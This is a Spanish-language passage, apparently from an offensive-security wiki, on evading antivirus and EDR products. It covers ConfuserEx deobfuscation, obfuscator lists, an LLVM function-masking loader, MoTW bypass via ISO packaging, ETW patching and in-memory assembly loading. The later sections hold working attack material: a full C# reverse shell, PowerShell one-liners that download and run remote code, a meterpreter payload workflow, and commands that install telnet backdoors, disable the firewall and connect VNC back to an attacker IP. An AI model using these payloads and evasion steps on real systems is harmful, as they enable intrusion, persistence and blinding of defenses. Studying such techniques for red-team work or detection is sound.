   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   La salida contiene los 6 parámetros anti-tamper (`key0-key3`, `nameHash`, `internKey`), que pueden ser útiles para crear tu propio unpacker.

2.  Recuperación de símbolos / flujo de control: pasa el archivo *clean* a **de4dot-cex** (un fork de de4dot compatible con ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Banderas:
     • `-p crx` – selecciona el perfil de ConfuserEx 2
     • de4dot deshará el aplanamiento del flujo de control, restaurará los espacios de nombres, las clases y los nombres de variables originales, y descifrará las cadenas constantes.

3.  Eliminación de proxy calls – ConfuserEx reemplaza las llamadas directas a métodos por wrappers ligeros (también llamados *proxy calls*) para dificultar aún más la descompilación. Elimínalos con **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Después de este paso, deberías observar API normales de .NET, como `Convert.FromBase64String` o `AES.Create()`, en lugar de funciones wrapper opacas (`Class8.smethod_10`, …).

4.  Limpieza manual – ejecuta el binario resultante en dnSpy y busca grandes bloques Base64 o usos de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar el payload *real*. A menudo, el malware lo almacena como un array de bytes codificado en TLV e inicializado dentro de `<Module>.byte_0`.

La cadena anterior restaura el flujo de ejecución **sin** necesidad de ejecutar la muestra maliciosa; resulta útil cuando se trabaja en una estación de trabajo sin conexión.

> 🛈  ConfuserEx genera un atributo personalizado llamado `ConfusedByAttribute` que se puede usar como IOC para clasificar muestras automáticamente.

#### Comando de una línea
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar una bifurcación de código abierto del conjunto de compilación [LLVM](http://www.llvm.org/) capaz de ofrecer mayor seguridad de software mediante la [ofuscación de código](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) y la protección contra manipulaciones.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo usar el lenguaje `C++11/14` para generar código ofuscado en tiempo de compilación, sin utilizar herramientas externas ni modificar el compilador.
- [**obfy**](https://github.com/fritzone/obfy): Añade una capa de operaciones ofuscadas generadas por el framework de metaprogramación de plantillas de C++, lo que dificultará un poco la vida de quien quiera crackear la aplicación.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador de binarios x64 capaz de ofuscar distintos archivos PE, incluidos .exe, .dll y .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame es un motor sencillo de código metamórfico para ejecutables arbitrarios.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de ofuscación de código de grano fino para lenguajes compatibles con LLVM que utiliza ROP (programación orientada al retorno). ROPfuscator ofusca un programa en el nivel del código ensamblador transformando instrucciones normales en cadenas ROP, lo que frustra nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un crypter de PE .NET escrito en Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor puede convertir EXE/DLL existentes en shellcode y luego cargarlos.

### Enmascaramiento propio por función asistido por el compilador LLVM

En lugar de enmascarar todo un implant solo mientras está inactivo, un backend X86 de LLVM modificado puede mantener funciones seleccionadas enmascaradas con XOR siempre que estén inactivas. La PoC Function Peekaboo selecciona nombres demangled que contienen `REG_`, inyecta stubs de entrada/salida independientes de la posición alrededor del código máquina final y genera un único handler compartido de enmascaramiento en `.text`; las firmas de nivel de código fuente y la convención de llamada de Windows x64 permanecen sin cambios.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformación del flujo de control en el backend

Esto debe realizarse después de la selección y optimización de instrucciones, porque la transformación debe cubrir **cada retorno emitido** y conocer el diseño exacto de x86. Un `MachineFunctionPass` previo a la emisión encuentra el último `MachineInstr::isReturn()`, lo elimina para que la ruta final continúe hasta el epílogo añadido y reemplaza los retornos anteriores con `JMP_1 handler`. Conserva cualquier desmontaje de pila/frame generado por el compilador antes de cada retorno; redirige únicamente la instrucción de retorno.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` y `emitFunctionBodyEnd()` emiten los stubs por función, mientras que `emitEndOfAsmFile()` emite el handler. Los símbolos compartidos entre las etapas de emisión permiten que una bifurcación del prólogo apunte a su epílogo posterior; para un `je` near emitido manualmente, escribe `0F 84` seguido de la expresión MC de cuatro bytes `target - address_after_je`. En su lugar, las llamadas y los saltos al handler pueden emitirse como objetos `MCInst` (`CALL64pcrel32` y `JMP_1`). Un pass debe devolver `false` para una función no seleccionada si no ha cambiado nada; la PoC devuelve incorrectamente `true` en ese caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadatos e inicialización previa al CRT

La PoC coloca una clave XOR y registros de 16 bytes que contienen un puntero a función reubicado por el loader y una longitud en tiempo de ejecución en `.funcmeta`. Aunque el campo C es un `uint32_t`, el handler accede a un QWORD en el desplazamiento `+8` del registro, consumiendo la longitud y su padding, y avanza por los registros de `0x10` en `0x10`. Los nombres de sección PE ocupan solo ocho bytes, por lo que la búsqueda en tiempo de ejecución ve `.funcmet`. Un parcheador externo añade un `.stub` ejecutable, guarda el RVA del punto de entrada anterior en el stub y redirige `AddressOfEntryPoint`; el stub PIC obtiene la base de la imagen desde `gs:[0x60]` → `[PEB+0x10]`, recorre las importaciones PE32+ para resolver un `VirtualProtect` ya importado y se ejecuta antes del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

La inicialización establece un centinela en `gs:[0xE8]` y llama a todas las funciones de metadatos. Su prólogo, que siempre permanece legible, registra el inicio de la función en `gs:[0xF0]`, detecta el centinela y omite el cuerpo, que todavía está desenmascarado. A continuación, el epílogo usa `call handler`; después de que el handler guarda 13 registros (`0x68` bytes), la dirección de retorno en `[rsp+0x68]` corresponde al final de la función transformada, por lo que se puede escribir `end - start` en su registro de metadatos. El stub borra el centinela y salta a `ImageBase + original_entry_point_RVA` después de enmascarar todos los cuerpos.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una llamada normal, el prólogo llama al mismo handler simétrico para decodificar el cuerpo. La ruta final continúa hasta el epílogo añadido, mientras que cada retorno anterior salta directamente al handler compartido. El epílogo normal también usa `jmp handler` en lugar de `call`, así que, tras volver a enmascarar, el `ret` del handler consume la dirección de retorno del llamador original y conserva el resultado de la función en `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva de enmascaramiento e indicadores de análisis

El handler encuentra el registro actual, omite el prólogo fijo visible (de `0x46` bytes en esta compilación), cambia el resto a `PAGE_EXECUTE_READWRITE`, aplica XOR byte a byte con el byte bajo de la clave y luego lo cambia a `PAGE_EXECUTE_READ`. Por tanto, el mismo bucle decodifica al entrar y codifica en cada salida normal.<sup>[[38]](#references)[[39]](#references)</sup>

Entre los indicadores de alta confianza de este diseño se incluyen:<sup>[[38]](#references)[[39]](#references)</sup>

- un punto de entrada dentro de un `.stub` ejecutable y una sección `.funcmet` que contiene una clave y punteros reubicados a `.text`;
- análisis del PEB, la tabla de importaciones y la tabla de secciones previo al CRT, seguido de llamadas a través de cada puntero de metadatos;
- prólogos PIC `call`/`pop` idénticos y numerosos sitios de retorno redirigidos a un único handler;
- escrituras en `gs:[0xE8]`, `gs:[0xF0]` y `gs:[0xF8]`, seguidas de transiciones repetidas de `VirtualProtect` y escrituras XOR byte a byte en páginas ejecutables respaldadas por la imagen.

Esto es evasión de escáneres de memoria, no protección criptográfica: el archivo parcheado todavía contiene el cuerpo original sin cifrar, y un debugger puede detenerse en `VirtualProtect` o en el bucle XOR y volcar la función activa. El XOR de un solo byte, los metadatos legibles y el límite fijo `0x46` también facilitan la recuperación sin conexión.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Los slots del TEB de la PoC son locales al hilo, pero las páginas de código modificadas son globales al proceso. Por tanto, una entrada concurrente o recursiva puede volver a alternar las instrucciones mientras otra invocación las está ejecutando; las excepciones y las salidas no locales también pueden omitir el re-enmascaramiento. Una implementación robusta debe sincronizar las transiciones, restaurar la protección realmente devuelta mediante `lpflOldProtect`, evitar longitudes de stub codificadas de forma fija, auditar las rutas `call` y `jmp` para garantizar la alineación de pila x64 y llamar a `FlushInstructionCache` después de reescribir bytes ejecutables. Microsoft responsabiliza explícitamente al llamador de la coherencia de la caché de instrucciones cuando se modifica código ejecutable.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen y MoTW

Es posible que hayas visto esta pantalla al descargar algunos ejecutables de Internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad diseñado para proteger al usuario final frente a la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente mediante un enfoque basado en la reputación; por ello, las aplicaciones descargadas con poca frecuencia activarán SmartScreen, que alertará al usuario final e impedirá que ejecute el archivo (aunque este todavía se puede ejecutar haciendo clic en Más información -> Ejecutar de todas formas).

**MoTW** (Mark of The Web) es un [flujo de datos alternativo de NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) llamado Zone.Identifier, que se crea automáticamente al descargar archivos de Internet, junto con la URL desde la que se descargaron.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobación del ADS Zone.Identifier de un archivo descargado de Internet.</p></figcaption></figure>

> [!TIP]
> Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **de confianza** **no activarán SmartScreen**.

Una forma muy eficaz de evitar que tus payloads reciban Mark of The Web es empaquetarlos en algún tipo de contenedor, como una ISO. Esto ocurre porque Mark-of-the-Web (MOTW) **no puede** aplicarse a volúmenes **que no sean NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta payloads en contenedores de salida para evadir Mark-of-the-Web.

Ejemplo de uso:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Aquí tienes una demostración para evadir SmartScreen empaquetando payloads dentro de archivos ISO con [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de registro de eventos de Windows que permite a las aplicaciones y a los componentes del sistema **registrar eventos**. Sin embargo, los productos de seguridad también pueden usarlo para supervisar y detectar actividades maliciosas.

Al igual que se deshabilita (evade) AMSI, también es posible hacer que la función **`EtwEventWrite`** del proceso en espacio de usuario retorne inmediatamente sin registrar eventos. Esto se consigue parcheando la función en memoria para que retorne inmediatamente, lo que deshabilita eficazmente el registro de ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) y [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflexión de ensamblados C#

Cargar binarios de C# en memoria es una técnica conocida desde hace bastante tiempo y sigue siendo una excelente forma de ejecutar tus herramientas de post-explotación sin que te detecte el AV.

Como el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos de parchear AMSI para todo el proceso.

La mayoría de los frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya permiten ejecutar ensamblados de C# directamente en memoria, pero hay distintas formas de hacerlo:

- **Fork\&Run**

Consiste en **crear un nuevo proceso desechable**, inyectar tu código malicioso de post-explotación en ese proceso, ejecutarlo y, al terminar, finalizar el proceso. Este método tiene ventajas e inconvenientes. La ventaja del método fork and run es que la ejecución ocurre **fuera** del proceso de nuestro implante Beacon. Esto significa que, si algo sale mal durante la acción de post-explotación o nos detectan, hay **muchas más posibilidades** de que nuestro **implante sobreviva**. El inconveniente es que tienes **más posibilidades** de que te detecten mediante **detecciones de comportamiento**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste en inyectar el código malicioso de post-explotación **en su propio proceso**. Así puedes evitar crear un proceso nuevo y que el AV lo analice, pero el inconveniente es que, si algo sale mal al ejecutar tu payload, hay **muchas más posibilidades** de **perder tu beacon**, ya que podría bloquearse.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre la carga de ensamblados de C#, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar ensamblados de C# **desde PowerShell**. Consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y [el video de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Reempaquetado de herramientas .NET como WebAssembly con NativeAOT (WasmForge)

Las técnicas normales de `execute-assembly` conservan MSIL reconocible y, con el tiempo, inicializan un CLR. **WasmForge** cambia el entorno de ejecución: migra un proyecto de C# al destino experimental NativeAOT-LLVM WASI, lo compila anticipadamente a WebAssembly e incrusta ese módulo en un host PE de Windows basado en Wazero. El proceso resultante no necesita el CLR, el JIT ni el host `dotnet` del sistema objetivo, por lo que las reglas basadas únicamente en nombres de ensamblados administrados, la carga del CLR, AMSI o .NET ETW pierden visibilidad directa. Esta es una técnica de evasión y empaquetado, no una evasión de los límites de privilegios: el proceso invitado conserva los permisos y el comportamiento observable del sistema operativo de la herramienta original.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilar un proyecto de C#

La ruta de compilación recomendada es el entorno Docker del proyecto, ya que incluye el SDK de .NET 10, la carga de trabajo NativeAOT-LLVM, WASI SDK 24.0, el enlazador y las dependencias de firma. Se detecta automáticamente un `.csproj`; la compilación en un solo paso realiza la migración, aplica parches de compatibilidad, compila a WASM, forja el PE y lo firma.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Para solucionar problemas o revisar el código generado, divide el proceso en `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` y, por último, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. La imagen de build también usa un wrapper `wasm-component-ld` para evitar la codificación de componentes de WASI Preview 2 y generar el módulo simple que espera el runtime integrado.<sup>[[44]](#references)[[45]](#references)</sup>

### Puente entre wasm32 C# y x64 Win32

No se trata de una recompilación transparente. NativeAOT-WASI carece de algunas funciones de BCL orientadas a Windows o las modifica, y un guest wasm32 normalmente asigna espacios de puntero de cuatro bytes, mientras que las API x64 pueden devolver punteros de ocho bytes. WasmForge aborda ambos problemas con las siguientes capas generadas:<sup>[[44]](#references)</sup>

1. Un patcher de código fuente corrige diferencias semánticas específicas de AOT y redirige llamadas no compatibles de registro, pipes, WMI, identidad, servicios de directorio, versiones de archivos, LSA y otras similares a helpers `Wf*`.
2. Un escáner P/Invoke genera asignaciones `DirectPInvoke` de NativeAOT para que las llamadas `[DllImport]` se vinculen a símbolos de puente C enlazados, en lugar de cargar dinámicamente la DLL declarada dentro del guest.
3. Los punteros vinculados al host usan `ulong` en C# y `uint64_t` en C. Un dispatcher genérico reenvía la llamada al handler Win32 del host; un `out8_mask` marca los espacios de salida de ocho bytes reales cuyos bytes superiores deben conservarse. Los espacios de salida sin marcar con forma wasm32 usan protección snapshot/restore para evitar que una escritura x64 corrompa los cuatro bytes adyacentes.
4. Puentes host dedicados gestionan operaciones que no encajan en el dispatch genérico de syscalls, como el acceso a la caché de tickets LSA, operaciones Kerberos/BCrypt con resultados estructurados, tráfico TCP KDC y consultas LDAP.

Por ejemplo, un wrapper para `version.dll!VerQueryValueW` pasa cuatro direcciones del host y activa los bits 2 y 3 (`0xC`), porque el puntero al valor y la longitud ocupan espacios de salida de ocho bytes. El wrapper sigue siendo genérico y delega el nombre de la DLL, el nombre de la exportación, los argumentos y la máscara a `wf_call_v2`; el host traduce los punteros e invoca la API nativa.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limitaciones y puntos de pivote para la detección

El código con mucha reflexión, la carga dinámica de ensamblados, las devoluciones de llamada nativas arbitrarias y las estructuras x64 complejas devueltas a la memoria WASM aún pueden requerir parches específicos para cada herramienta o fallar por completo. Los sockets genéricos de WASI Preview 2 también pueden llegar a stubs que no hacen nada, por lo que las herramientas compatibles usan shims de host específicos para cada protocolo. Valida cada comando frente a una compilación nativa en lugar de asumir que las funciones son equivalentes.<sup>[[44]](#references)[[45]](#references)</sup>

Esta técnica cambia la telemetría en lugar de hacer que el payload sea invisible. La detección puede pivotar hacia un PE que contenga o materialice un módulo WASM, un comportamiento de runtime similar a Wazero, asignación y copia inusuales de memoria entre host y guest, despacho genérico directo a Win32, anomalías en la firma y los recursos PE, además de las llamadas a la API y el tráfico de red resultantes. Por lo tanto, la ausencia de eventos de carga de CLR, AMSI o .NET ETW no debe considerarse evidencia de que un proceso es benigno.<sup>[[44]](#references)</sup>

## Usar otros lenguajes de programación

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes al dar a la máquina comprometida acceso **al entorno de intérprete instalado en el recurso compartido SMB controlado por el atacante**.

Al permitir el acceso a los binarios del intérprete y al entorno del recurso compartido SMB, puedes **ejecutar código arbitrario en estos lenguajes en la memoria** de la máquina comprometida.

El repositorio indica que Defender sigue analizando los scripts, pero al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para evadir las firmas estáticas**. Las pruebas con scripts de reverse shell aleatorios y sin ofuscar en estos lenguajes han tenido éxito.

## Rehosting de WebAssembly para evadir el análisis estático

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipula el token de acceso de un producto de seguridad, como un EDR o un AV. Reducir los privilegios del token puede dejar el proceso en ejecución e impedir que realice acciones privilegiadas de inspección o corrección.

Para evitarlo, Windows podría **impedir que procesos externos** obtengan handles de los tokens de los procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Usar software confiable

### Chrome Remote Desktop

Como se describe en [**esta publicación del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil simplemente implementar Chrome Remote Desktop en el PC de una víctima y luego usarlo para tomar el control y mantener la persistencia:<sup>[[35]](#references)</sup>
1. Descárgalo desde https://remotedesktop.google.com/, haz clic en "Set up via SSH" y luego en el archivo MSI para Windows para descargarlo.
2. Ejecuta el instalador silenciosamente en la víctima (se requieren permisos de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vuelve a la página de Chrome Remote Desktop y haz clic en siguiente. El asistente te pedirá que autorices; haz clic en el botón Authorize para continuar.
4. Ejecuta el comando proporcionado con los ajustes necesarios: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (el parámetro `--pin` establece el PIN sin usar la GUI).
 

## Evasión avanzada

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

La evasión es un tema muy complicado; a veces hay que tener en cuenta muchas fuentes distintas de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno al que te enfrentes tendrá sus propias fortalezas y debilidades.

Te recomiendo encarecidamente que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94) para familiarizarte con técnicas de evasión más avanzadas.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta también es otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre la evasión en profundidad.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas antiguas**

### **Comprobar qué partes detecta Defender como maliciosas**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **eliminará partes del binario** hasta **averiguar qué parte detecta Defender** como maliciosa y te la separará.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred), que ofrece el servicio en la web abierta [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Hasta Windows10, todos los Windows incluían un **servidor Telnet** que podías instalar (como administrador) haciendo lo siguiente:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Configúralo para que se inicie al arrancar el sistema y ejecútalo ahora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Cambiar el puerto de telnet** (sigilo) y deshabilitar el firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Descárgalo de: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (necesitas las descargas bin, no el instalador)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Activa la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo _**UltraVNC.ini**_ recién creado al interior de la **víctima**

#### **Conexión inversa**

El **atacante** debe **ejecutar en su** **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para recibir una **conexión VNC** inversa. Luego, dentro de la **víctima**: inicia el daemon winvnc con `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo, no debes hacer algunas cosas

- No inicies `winvnc` si ya se está ejecutando o activarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). Comprueba si se está ejecutando con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o se abrirá [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para obtener ayuda o activarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo de: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dentro de GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Ahora **inicia el listener** con `msfconsole -r file.rc` y **ejecuta** el **payload xml** con:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**El Defender actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer Revershell de C#

Compílalo con:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Úsalo con:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# usando el compilador

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
